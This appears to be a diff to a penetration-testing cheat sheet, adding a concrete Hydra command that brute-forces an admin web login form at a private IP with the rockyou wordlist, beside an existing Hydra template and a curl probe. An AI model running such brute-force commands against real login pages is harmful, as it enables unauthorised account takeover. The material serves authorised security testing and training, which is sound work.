@@ -32,6 +32,9 @@ kali@kali:~$ curl -i http://example.com/users/v1
 
 # Bruteforce login with Hydra
 kali@kali:~$ hydra -L users.txt -P password.txt <IP/Domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed" -V
+
 # Use https-form-mode for HTTPS
 # Check response with BurpSuite to configure /path
 ```
